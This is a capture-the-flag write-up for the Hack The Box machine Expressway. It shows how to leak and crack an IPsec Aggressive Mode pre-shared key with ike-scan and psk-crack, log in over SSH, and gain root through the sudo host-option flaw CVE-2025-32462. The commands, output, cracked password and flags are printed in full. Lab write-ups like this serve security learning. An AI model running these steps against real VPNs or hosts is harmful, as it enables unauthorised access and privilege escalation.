---
title: Hack the Box - Expressway
time: 2025-11-21 12:00:00
categories: [htb, easy]
tags: [ipsec]

---

Expressway is an Easy Linux machine that demonstrated a misconfigured IPsec VPN service (ISAKMP/IKEv1) exposing a Pre-Shared Key (PSK) through Aggressive Mode, which allowed hash-cracking of the VPN group secret. Privilege escalation was achieved due to an unauthorized and vulnerable sudo binary (sudo 1.9.17). This binary allowed host-based sudoers misconfiguration exploitation, ultimately granting full root privileges.

<img width="936" height="134" alt="image" src="https://github.com/user-attachments/assets/5d71d011-121e-47be-8181-1e41e1444a4b" />

## Recon
### Initial Scanning

`nmap` finds one open TCP port, which is SSH (22). I tried to scan several times, but the result is still the same. Since it is not possible to bruteforce username and password for SSH, we need to check also the UDP ports.
```bash
─ nmap -p- -v --min-rate 1000 10.10.11.87
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-20 22:06 +08
Initiating Ping Scan at 22:06
Scanning 10.10.11.87 [2 ports]
Nmap scan report for 10.10.11.87 (10.10.11.87)
Host is up (0.055s latency).
Not shown: 65419 closed tcp ports (conn-refused), 115 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh

─ nmap -p 22 -sCV 10.10.11.87
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-20 22:06 +08
Nmap scan report for 10.10.11.87 (10.10.11.87)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A UDP scan identified one critical open port, which is isakmp (500).

> ISAKMP on port 500 is the service responsible for negotiating cryptographic keys (IKEv1 or IKEv2) for IPsec VPN tunnels.

```bash
╰─ sudo nmap -p-1000 -sU -v --min-rate 1000 10.10.11.87
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-20 22:20 +08
Nmap scan report for 10.10.11.87 (10.10.11.87)
Host is up (0.15s latency).
Not shown: 990 open|filtered udp ports (no-response)
PORT    STATE  SERVICE
42/udp  closed nameserver
48/udp  closed auditd
266/udp closed sst
269/udp closed manet
391/udp closed synotics-relay
496/udp closed pim-rp-disc
500/udp open   isakmp
763/udp closed cycleserv
952/udp closed unknown
966/udp closed unknown
```

#### UDP 500 (ISAKMP)

We can refer to this <a href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting#capturing-and-cracking-the-hash">blog</a> for enumerating the service.

```
╰─ ike-scan -M --showbackoff 10.10.11.87  
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=5713c6a9f33bc491)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

IKE Backoff Patterns:

IP Address      No.     Recv time               Delta Time
10.10.11.87     1       1763650341.673317       0.000000
10.10.11.87     Implementation guess: Linksys Etherfast

Ending ike-scan 1.9.5: 1 hosts scanned in 60.164 seconds (0.02 hosts/sec).  1 returned handshake; 0 returned notify
```

`ike-scan` reports two important values:

```
1 returned handshake; 0 returned notify
```

> `0 returned handshake; 0 returned notify`: This means the target is not an IPsec gateway.
> 
> `1 returned handshake; 0 returned notify`: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you
> proposed are acceptable (a valid transform will be shown in the output).
>
> `0 returned handshake; 1 returned notify`:None of the transforms are acceptable 

So, the server is **definitely an IPsec VPN** and it is configured correctly and responding with valid encryption/auth configuration.

Also, it shows the exact VPN cryptographic parameters:

```
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
```

| Field                    | Meaning                                                     |
| ------------------------ | ----------------------------------------------------------- |
| **Enc = 3DES**           | Weak encryption (deprecated)                                |
| **Hash = SHA1**          | Also weak                                                   |
| **Group = 2 (modp1024)** | Weak DH group (vulnerable to attacks like Logjam)           |
| **Auth = PSK**           | The VPN uses a **Pre-Shared Key** — this is brute-forceable |
| **Life = 28800s**        | SA lifetime (8 hours)                                       |

## Shell as ike
### Cracking hash
> PSK authentication (Auth=PSK) can be **offline-bruteforced** if you capture the Aggressive Mode hash and have the correct ID (group name).
> Main Mode does *not* leak the PSK hash—but you can still brute-force **Group IDs**.

Next, we try to do Aggressive Mode, we try a `fakeID` to see its response.

```
╰─ ike-scan -P -M -A -n fakeID 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=7254adcb3720fbcc)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
3a5e3faf250a61a637dc10482d10702bca7dc5c93e365dc1cfe835fb7c7934e72bfe97ad822a0f71a4d408faff70aa87ae2bcce56a39d3e79f4ea4aa2171668b39f838dd1f20324ede24557c0b3bdb04342b42cc89cda990a722bfb7343c22c34f55d6918086bd6026f4e53de896cc9a444be5921c373f7a34e9d1483d93bfcc:e7d62387a89521b468da8092110031ebd154126ba620639812821956956854717bce7ae020915aeb64e0d61d395228cbbfadcc30224ad639e733f18b4fe042e17f046e867591d1e89788f41a2977e0768fc12b987ced72b9bb74ba7b2b05e23149ccd6ef6c99f380bc521afa9e081b1b49a377912dac59d74cea7f347f874dfe:7254adcb3720fbcc:4495868dcdaed4a0:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:3400e9edf5918088820211e4c7f1f294baaec062:6511653b8c6f4b4ad37ecc859bf875e12442df2c1fe20f512b3067d52a19ed6c:6045bf13fcb9b3908b127d707dbccc494a334e85
Ending ike-scan 1.9.5: 1 hosts scanned in 0.059 seconds (17.06 hosts/sec).  1 returned handshake; 0 returned notify
```

My mistake right here is that I didnt realize that GroupID is infornt of me, so I tried to bruteforcce it using sveral available scripts.

The server supports Aggressive Mode, which is insecure because it leaks the Group ID (IDi) before authentication. Even when providing a fake ID, the server responds with its real GroupID `ike@expressway.htb`. So, we do not need to brute-force group names and allow for PSK cracking.

The PSK hash was extracted into `hash.txt`;
```bash
╰─ ike-scan -M -A -n expressway.htb --pskcrack=hash.txt 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=2c861bfb1276fb9c)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.061 seconds (16.46 hosts/sec).  1 returned handshake; 0 returned notify
```
You can use psk-crack, john (using ikescan2john.py) and hashcat to crack the hash:

We get the password `freakingrockstarontheroad`.
```
╰─ psk-crack -d /usr/share/wordlists/dirbuster/rockyou.txt hash.txt 
Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash c9c7b9f8f7dee876bd38e66cb7151cda58dce123
Ending psk-crack: 8045039 iterations in 13.693 seconds (587538.85 iterations/sec)
```
### User flag
The password allowed authentication as user `ike` via SSH. 
```bash
╰─ ssh ike@10.10.11.87                                 
ike@10.10.11.87's password: 
Last login: Thu Nov 20 13:11:41 GMT 2025 from 10.10.16.58 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
Last login: Thu Nov 20 15:31:09 2025 from 10.10.14.108
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt
03a700b8c72*******************
```
## Shell as root

I try to check `sudo` but we don't have the privilege to run it.
```bash
ike@expressway:~$ sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.
```
Running LinEnum.sh, we found several SUID files;
```bash
[-] SUID files:
-rwsr-xr-x 1 root root 1533496 Aug 14 12:58 /usr/sbin/exim4
-rwsr-xr-x 1 root root 1047040 Aug 29 15:18 /usr/local/bin/sudo
-rwsr-xr-x 1 root root 118168 Aug 26 22:05 /usr/bin/passwd
-rwsr-xr-x 1 root root 76240 Sep  9 10:09 /usr/bin/mount
-rwsr-xr-x 1 root root 88568 Aug 26 22:05 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 92624 Sep  9 10:09 /usr/bin/su
-rwsr-xr-x 1 root root 281624 Jun 27  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 63952 Sep  9 10:09 /usr/bin/umount
-rwsr-xr-x 1 root root 70888 Aug 26 22:05 /usr/bin/chfn
-rwsr-xr-x 1 root root 52936 Aug 26 22:05 /usr/bin/chsh
-rwsr-xr-x 1 root root 18888 Sep  9 10:09 /usr/bin/newgrp
-rwsr-xr-- 1 root messagebus 51272 Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 494144 Aug 10 00:07 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 13712 Aug 28 09:04 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14416 Aug 28 09:04 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```
Among typical binaries, one unusual entry appeared:
```bash
-rwsr-xr-x 1 root root /usr/local/bin/sudo
```

This custom sudo binary was suspicious because:

- It resides outside standard directories.
- The version differed from the system default.
- It was SUID-root.

Upon checking, we are not using the default `/usr/bin/sudo` as sudo; instead we are using `/usr/local/bin/sudo`.
```bash
ike@expressway:~$ which sudo
/usr/local/bin/sudo
```

The version is also different:
```bash
/usr/bin/sudo          → 1.9.13p3
/usr/local/bin/sudo    → 1.9.17 
```

Doing some research, Sudo 1.9.17 is affected by <a href=" https://www.exploit-db.com/exploits/52354">CVE-2025-32462</a> — Host Option Privilege Escalation.

Looks like we need to read sudoers file to see what are the hosts that we can execute command as. 
<img width="707" height="288" alt="image" src="https://github.com/user-attachments/assets/e222ec52-22a5-415c-908c-79fd8f653b82" />

I tried to read sudoers file, but got no permission.
```
ike@expressway:~$ cat  /etc/sudoers
cat: /etc/sudoers: Permission denied
```

I tried to search for any directories that contain `expressway.htb` string, and we found one at `/var/log/squid/access.log`. 
```
grep -R "expressway.htb" /var/log 2>/dev/null
/var/log/squid/access.log.1:1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```
By specifying a host with `-h`, sudo resolves host-based sudo rules before password authentication. `ike` can run commands on `offramp.expressway.htb` as root.

```
ike@expressway:~$ sudo -l -h offramp.expressway.htb
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

First, we check our user privelege using `id`. Then, execute a root shell on `offramp.expressway.htb` by specifying the `-h offramp.expressway.htb`
option.
```bash
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ sudo -i -h offramp.expressway.htb
root@expressway:~# ls
root.txt
```
### Root Flag
We get root shell and read the last flag.
```bash
root@expressway:~# cat root.txt
502864d749c652697cbe55eaf98b8b5b
```
### What is CVE-2025-32462?

`CVE-2025-32462` is a local privilege-escalation flaw in sudo (affecting many versions up through 1.9.17). The bug concerns the `-h/--host` option: that option was intended to be used only for listing (`sudo -l`) on behalf of another host, but the vulnerable version allowed it to use for other sudo operations. 

In environments where sudoers entries restrict commands by host, an attacker who already has some sudo rights (even limited ones) can trick sudo into thinking the request came from a permitted host and thereby execute commands they shouldn’t be allowed to run. Patches were released in 1.9.17p1 and by major distros. 

